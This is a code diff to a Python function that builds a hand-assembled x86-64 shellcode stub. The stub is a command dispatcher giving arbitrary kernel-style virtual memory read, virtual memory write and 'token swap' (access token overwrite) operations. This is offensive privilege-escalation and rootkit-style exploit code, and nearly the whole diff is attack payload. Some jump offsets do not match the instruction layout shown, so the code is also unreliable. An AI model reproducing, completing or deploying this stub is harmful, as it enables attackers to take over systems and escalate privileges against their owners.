@@ -64,17 +64,40 @@ def construct_dispatcher_stub():
         0x74, 0x30,                                 # jz heartbeat (Offset to be calculated)
         
         # Dispatcher Logic
+        0x83, 0xF8, 0x01,                           # cmp eax, 1 (Read Virtual)
+        0x74, 0x0A,                                 # je cmd_read
+        0x83, 0xF8, 0x02,                           # cmp eax, 2 (Write Virtual)
+        0x74, 0x14,                                 # je cmd_write
         0x83, 0xF8, 0x03,                           # cmp eax, 3 (Token Swap)
-        0x75, 0x1A,                                 # jne clear_cmd
+        0x74, 0x22,                                 # je cmd_swap
+        0xEB, 0x2E,                                 # jmp clear_cmd
         
-        # Command 0x03: Token Swap
-        # TargetAddr = [rcx + 0x10]
-        # NewValue   = [rcx + 0x18]
+        # Command 0x01: Read Virtual
+        # TargetVA = [rcx + 0x10]
+        # Result   = [rcx + 0x20]
+        # cmd_read:
+        0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
+        0x48, 0x8B, 0x12,                           # mov rdx, [rdx]
+        0x48, 0x89, 0x51, 0x20,                     # mov [rcx + 0x20], rdx
+        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
+        0xEB, 0x1E,                                 # jmp clear_cmd
+
+        # Command 0x02: Write Virtual
+        # TargetVA = [rcx + 0x10]
+        # Value    = [rcx + 0x18]
+        # cmd_write:
         0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
         0x4C, 0x8B, 0x41, 0x18,                     # mov r8, [rcx + 0x18]
         0x49, 0x89, 0x02,                           # mov [rdx], r8
         0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
-        0xEB, 0x07,                                 # jmp clear_cmd
+        0xEB, 0x0E,                                 # jmp clear_cmd
+        
+        # Command 0x03: Token Swap
+        # cmd_swap:
+        0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
+        0x4C, 0x8B, 0x41, 0x18,                     # mov r8, [rcx + 0x18]
+        0x49, 0x89, 0x02,                           # mov [rdx], r8
+        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
         
         # clear_cmd:
         0xC7, 0x01, 0x00, 0x00, 0x00, 0x00,         # mov dword ptr [rcx], 0 (Cmd=Idle)
